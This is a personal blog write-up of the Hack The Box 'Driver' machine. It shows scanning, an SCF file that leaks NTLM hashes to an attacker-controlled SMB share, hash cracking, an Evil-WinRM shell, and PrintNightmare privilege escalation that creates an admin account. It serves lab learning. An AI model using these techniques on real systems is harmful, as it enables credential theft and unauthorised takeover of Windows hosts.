<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>Driver Write Up</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->
    
    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="Infosec | Hacking | CTF" />
    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
    <link rel="canonical" href="https://darrynbrownfield.co.uk/driver" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="Darryn Brownfield" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Driver Write Up" />
    <meta property="og:description" content="Overview Driver is a easy box from Hack The Box, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me. Nmap I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan" />
    <meta property="og:url" content="https://darrynbrownfield.co.uk/driver" />
    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/driver/cover.png" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta property="article:author" content="https://www.facebook.com/" />
    <meta property="article:published_time" content="2022-02-27T00:00:00+00:00" />
    <meta property="article:modified_time" content="2022-02-27T00:00:00+00:00" />
    <meta property="article:tag" content="Hackthebox" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Driver Write Up" />
    <meta name="twitter:description" content="Overview Driver is a easy box from Hack The Box, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me. Nmap I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan" />
    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/driver/cover.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Darryn Brownfield" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="Hackthebox" />
    <meta name="twitter:site" content="@dazbrownfield" />
    <meta name="twitter:creator" content="@dazbrownfield" />
    <meta property="og:image:width" content="1400" />
    <meta property="og:image:height" content="933" />

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "Darryn Brownfield",
        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
    },
    "url": "https://darrynbrownfield.co.uk/driver",
    "image": {
        "@type": "ImageObject",
        "url": "https://darrynbrownfield.co.uk/assets/images/driver/cover.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://darrynbrownfield.co.uk/driver"
    },
    "description": "Overview Driver is a easy box from Hack The Box, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me. Nmap I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan"
}
    </script>

    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
    <script type="text/javascript">
    ghost.init({
    	clientId: "ghost-frontend",
    	clientSecret: "f84a07a72b17"
    });
    </script> -->

    <meta name="generator" content="Jekyll 3.6.2" />
    <link rel="alternate" type="application/rss+xml" title="Driver Write Up" href="/feed.xml" />


</head>
<body class="post-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            

            
        
        
            <ul class="nav" role="menu">
    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
            <a
              class="social-link social-link-tw"
              href="https://github.com/darrynb89"
              target="_blank"
              rel="noopener"
              ><svg
  version="1.0"
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 120.000000 120.000000"
>
  <g
    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
    fill="#ffffff"
    stroke="none"
  >
    <path
      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
    />
  </g>
</svg></a
            >
            
            <a
              class="social-link social-link-li"
              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
              target="_blank"
              rel="noopener"
              ><svg viewBox="0 50 512 512">
    <g transform="translate(0.000000,20.000000) scale(1.1)">
      <path
        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
      />
    </g>
  </svg></a
            >
             
            <a
              class="social-link social-link-tw"
              href="https://twitter.com/dazbrownfield"
              target="_blank"
              rel="noopener"
              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a
            >
             
          </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full  tag-hackthebox tag-ctf tag-easy post ">

            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime="27 February 2022">27 February 2022</time>
                    
                        <span class="date-divider">/</span>
                        
                            
                               <a href='/tag/hackthebox/'>HACKTHEBOX</a>,
                            
                        
                            
                               <a href='/tag/ctf/'>CTF</a>,
                            
                        
                            
                               <a href='/tag/easy/'>EASY</a>
                            
                        
                    
                </section>
                <h1 class="post-full-title">Driver Write Up</h1>
            </header>

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p><img src="/assets/images/driver/cover.png" alt="cover" /></p>

<h3 id="overview">Overview</h3>

<p><a href="https://app.hackthebox.com/machines/Driver">Driver</a> is a easy box from <a href="https://hackthebox.com">Hack The Box</a>, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me.</p>

<h3 id="nmap">Nmap</h3>

<p>I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.</p>

<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
Nmap scan report for 10.10.11.106
Host is up (0.020s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-28T00:20:49
|_  start_date: 2022-02-27T04:55:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
</code></pre>

<p>3 Ports open:</p>

<ul>
  <li>80 - HTTP - Microsoft IIS httpd 10.0</li>
  <li>135 - MSRPC - Microsoft Windows RPC</li>
  <li>445 - SMB - Microsoft Windows 7 - 10 microsoft-ds</li>
</ul>

<p>I also ran a full port scan and found winrm to be open on port 5985.</p>

<pre><code class="language-highlight">└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
Nmap scan report for 10.10.11.106
Host is up (0.026s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
</code></pre>

<p>The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.</p>

<h3 id="enumeration">Enumeration</h3>

<p>Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.</p>

<pre><code class="language-highlight">└──╼ $cme smb 10.10.11.106
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $smbmap -H 10.10.11.106
[!] Authentication error on 10.10.11.106
</code></pre>

<p>So I turned my attention to the web service. Navigating to the IP I did get a login prompt. I tried admin:admin and got in!</p>

<p><img src="/assets/images/driver/login.png" alt="login" /></p>

<p>Once logged in, I get a simple web page but an email address of ‘support@driver.htb’. I updated my host file with ‘driver.htb’ just in case I need it later.</p>

<p><img src="/assets/images/driver/homepage.png" alt="homepage" /></p>

<p>The only link that works on the web page is ‘Firmware Updates’. This page provides an upload function. I played around with this for such a long time, trying attacks like XSS, uploading PHP shells but nothing worked.</p>

<p><img src="/assets/images/driver/upload.png" alt="upload" /></p>

<p>However re-reading the line:</p>

<blockquote>
  <p>Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.</p>
</blockquote>

<p>I decided to change my google search to “http smb file share exploit” and found an article on using SCF files.</p>

<h3 id="initial-access">Initial Access</h3>

<p>The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.</p>

<pre><code class="language-highlight">└──╼ $cat test.scf 
[Shell]
Command=2
IconFile=\\10.10.14.11\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
</code></pre>

<p>I started responder with the command ‘<code class="highlighter-rouge">sudo responder -I tun0</code>’.</p>

<p>Then uploaded the file using the web upload function and got a hit from responder</p>

<pre><code class="language-highlight">[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0
0350032003700430037004C004F004F0030004300360004003400570049004E002D00350032003700430037004C004F004F003000430036002E0035005400340048002E004C004F00430041004C000300140035005400340048002E004C004F004
30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
7F84AACEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
</code></pre>

<p>I put the hash in to a file called ‘hash’ and used hashcat to crack it with the command <code class="highlighter-rouge">hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt</code>.</p>

<p>Now I had a username and password I was able to use winrm to login. To login I used <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>.</p>

<pre><code class="language-highlight">└──╼ $/opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents&gt; 
</code></pre>

<h3 id="priv-esc">Priv Esc</h3>

<p>Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service.</p>

<pre><code class="language-highlight">    381      23     5164      14448 ...12            1128 spoolsv
</code></pre>

<p>This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.</p>

<pre><code class="language-highlight">└──╼ $rpcdump.py 10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol 
</code></pre>

<p>To exploit this I used the <a href="https://github.com/calebstewart/CVE-2021-1675">exploit</a> created by <a href="https://twitter.com/calebjstewart">Caleb Stewart</a> and <a href="https://twitter.com/_JohnHammond">John Hammond</a>.</p>

<p>I used git to clone the repo in to my /opt directory.</p>

<pre><code class="language-highlight">└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (40/40), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
┌─[daz@parrotos]─[/opt]
└──╼ $cd CVE-2021-1675
┌─[daz@parrotos]─[/opt/CVE-2021-1675]
└──╼ $ls
CVE-2021-1675.ps1  nightmare-dll  README.md
</code></pre>

<p>Now using Evil-WinRM I can upload the powershell script and execute it.</p>

<pre><code class="language-highlight">*Evil-WinRM* PS C:\Users\tony\Documents&gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1

                                                             
Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\tony\Documents&gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
</code></pre>

<p>It worked! I canceled my current WinRM session and logged back in using the new credentials.</p>

<pre><code class="language-highlight">*Evil-WinRM* PS C:\Users\tony\Documents&gt; exit

Info: Exiting with code 0

┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $/opt/evil-winrm/evil-winrm.rb -u adm1n -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\adm1n\Documents&gt; cd C:/Users/Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/26/2022   8:56 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt

</code></pre>

<p>Thats the box, thanks for reading!</p>

<p>==========================================================================</p>

<p>Any comments or feedback welcome! You can find me on <a href="https://twitter.com/dazbrownfield">twitter</a>.</p>

<p><a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" /></a></p>


                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>



        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2022</section>
                <nav class="site-footer-nav">
                    <a href="/">Latest Posts</a>
                 </nav>
            </div>
        </footer>

    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-175458891-1', 'auto');
  ga('send', 'pageview');

 </script>


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
            header.classList.add('floating-active');
        } else {
            header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->

</body>
</html>
